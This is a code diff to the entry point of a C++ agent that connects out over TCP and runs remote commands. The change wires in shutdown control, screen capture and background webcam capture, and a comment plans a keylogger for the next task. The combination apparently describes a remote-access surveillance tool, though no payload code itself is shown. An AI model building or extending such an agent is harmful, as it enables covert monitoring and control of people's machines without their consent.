@@ -7,10 +7,13 @@
 // process and file families live; verbs of the not-yet-implemented families
 // resolve through the same dispatcher to the structured unsupported result,
 // so the command set is already complete at this thin entry point.
+#include "camera.hpp"
+#include "capture.hpp"
 #include "command_handler.hpp"
 #include "config.hpp"
 #include "logging.hpp"
 #include "matrix.hpp"
+#include "power.hpp"
 #include "session.hpp"
 #include "tcp.hpp"
 #include "transport.hpp"
@@ -74,13 +77,22 @@ int main(int argc, char* argv[]) {
     // "retries connection attempts at a bounded interval instead of exiting").
     const transport::DialPolicy policy{};
 
-    // Phase 6 (tasks 6.1-6.3): the closed-set dispatcher behind every
-    // session. Process and file families are live; power/capture/camera/
-    // input/app verbs resolve to the structured unsupported result until
-    // their family tasks land (6.4-6.8 route through this same object).
+    // Phase 6 (tasks 6.1-6.6): the closed-set dispatcher behind every
+    // session. Process, file, power, capture and camera families are live
+    // (camera through the shared background-job registry); input/app verbs
+    // resolve to the structured unsupported result until their family tasks
+    // land (6.7-6.8 route through this same object).
     tether::syscalls::CommandDispatcher dispatcher;
     dispatcher.set_process_control(tether::syscalls::make_process_control());
     dispatcher.set_file_system(tether::syscalls::make_file_system());
+    // Task 6.4 power: Windows ExitWindowsEx behind the confirm gate; Linux
+    // logind over D-Bus (dlopen'd sd-bus, no link-time dependency).
+    dispatcher.set_power_control(tether::syscalls::make_power_control());
+    // Task 6.5 capture: Windows GDI / Linux X11 -> PNG deliverable.
+    dispatcher.set_screen_capture(tether::syscalls::make_screen_capture());
+    // Task 6.6 camera: background jobs over cv::VideoCapture in the shared
+    // registry (the keylogger plugs into the same registry in task 6.7).
+    dispatcher.set_camera_capture(tether::syscalls::make_camera_capture());
 
     for (;;) {
         std::unique_ptr<transport::TcpAgentLink> link;
